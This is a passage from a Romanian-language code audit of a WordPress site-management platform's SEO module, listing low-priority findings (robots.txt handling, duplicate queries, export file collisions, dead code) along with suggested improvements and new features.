| S-P3-1 | P3 | `CrawlSitePages.php:192,751-768` | Crawler-ul nu respectă `Disallow` din robots.txt (doar înregistrează `blocked_by_robots`) și nici `Crawl-delay`; UA custom nedocumentat pe site-urile clienților. | Crawl pe zone excluse intenționat (ex. staging paths) — surprize pentru clienți. | Opțiune „respect robots.txt" per monitor (implicit on). |
| S-P3-2 | P3 | `CrawlSitePages.php:110-116,601-619` | Redirect target-ul e adăugat în coadă fără `shouldSkipUrl` (poate crawla căi excluse); `resolveUrl` nu normalizează `../` → URL-uri duplicate sub altă formă. | Redirect spre `/wp-content/uploads/...` e crawl-at; `/a/../b` și `/b` numărate separat. | Treceți redirecturile prin `shouldSkipUrl`; normalizare de path. |
| S-P3-3 | P3 | `site-seo-audit.blade.php:506,537` | `$this->keywordRankings->paginate(50)` apelat de două ori în același render — query duplicat. | Pagina Keywords execută dublu query-ul de rankings la fiecare interacțiune. | Calculați paginarea o singură dată (computed). |
| S-P3-4 | P3 | `SeoQuickAudit.php:119-124` | Quick Audit creează un `Site` prospect nou la fiecare rulare, chiar pentru același URL. | 10 rulări pe același prospect → 10 site-uri fantomă + 10 seturi de date. | Reutilizați prospect-ul existent după URL normalizat. |
| S-P3-5 | P3 | `ExcelExportService.php:55` | Path-ul temporar `storage_path('app/temp/seo-audit-{domain}-{Y-m-d}.xlsx')` e determinist — două exporturi concurente ale aceluiași site se suprascriu. | Doi operatori exportă simultan → unul primește fișierul trunchiat/al celuilalt. | Sufix unic (uuid) în numele fișierului. |
| S-P3-6 | P3 | `AnalyzeSeoPages.php:232-234` | „Missing canonical" e raportat per pagină ca Medium — pe multe site-uri WP fără plugin SEO acest lucru domină lista și scorul, deși e discutabil ca importanță. | Zgomot masiv de issue-uri Medium pe site-uri altfel OK. | Downgrade la Low/Info sau agregare site-wide. |
| S-P3-7 | P3 | `SiteAuditService.php:16-19`; `config/seo.php:6` (`concurrency`) | Cod mort mărunt: monitorul creat în `startAudit` nefolosit; `concurrency` din config neimplementat. | — | Curățare. |

**Contor:** P0: 0 · P1: 6 · P2: 11 · P3: 7.

*Neverificat:* comportamentul real în producție al buclei S-P1-4 (nu am acces la DB/loguri de producție în acest audit); existența unor site-uri cu connector pre-2.x care ar accepta alt header (improbabil — plugin-ul e distribuit din acest repo și `git log -S` nu găsește vreodată `X-SAM-API-Key` în plugin).

---

## Oportunități de îmbunătățire

### (a) Îmbunătățiri la feature-urile existente

1. **Reparați integrarea connector și re-lansați „SEO Fix" în siguranță** — rutați apelurile prin `WordPressHttpClient`, adăugați preview + confirmare + logging la `bulkFix` și mutați-l într-un job. Deblochează instantaneu și endpoint-urile deja scrise dar fără UI (`update-alt-text`, CRUD redirects din `class-seo-endpoint.php:63-95`).
2. **Faceți eșecurile vizibile**: notificare pe `failed()` (canalul de notificări există deja — modul 20), badge „last audit failed" în `SeoOverview`, și backoff pe `next_audit_at` la eșec — elimină și bucla S-P1-4.
3. **Split-ul crawl/verificări**: `CheckBrokenResources` există deja și face exact verificarea link-urilor/imaginilor — folosiți-l ca pas 2 al lanțului în loc să dublați logica în `CrawlSitePages` (`:272-306` vs `CheckBrokenResources.php:64-118`, cod aproape identic), rezolvând bugetul de timp.
4. **Export Excel queue-uit** cu link de download + `StringValueBinder` — rezolvă S-P1-5 și S-P2-10 dintr-o mișcare; pattern-ul de download semnat există deja la backupuri.
5. **Deduplicare Quick Audit pe URL + buton „Convert prospect to client site"** — quick audit-ul e folosit clar pentru pre-sales; azi prospectul rămâne date moarte.

### (b) Feature-uri noi

1. **Secțiune SEO în rapoartele lunare pentru clienți** (modul 18): scor + delta + top issues rezolvate + keyword-uri GSC — toate datele există deja (`category_scores`, `data['diff']`, `seo_keyword_rankings`); benchmark ManageWP/WPMU DEV care vând exact acest raport. **Efort: M.**
2. **Alerte de poziție pe keyword-uri urmărite**: `is_tracked` + istoricul zilnic există (`SeoKeywordRanking`); lipsește doar un job de comparare + notificare la scăderi > N poziții. **Efort: S.**
3. **Monitor de regresie SEO „post-deploy"**: la finalul unui `RunSafeUpdate`/restore (module 12-13), declanșați un mini-audit (max 20 pagini: home + top pages) și comparați noindex/robots/canonical/status — prinde clasicul „site lansat cu Discourage search engines". Infrastructura de crawl și diff există. **Efort: M.**
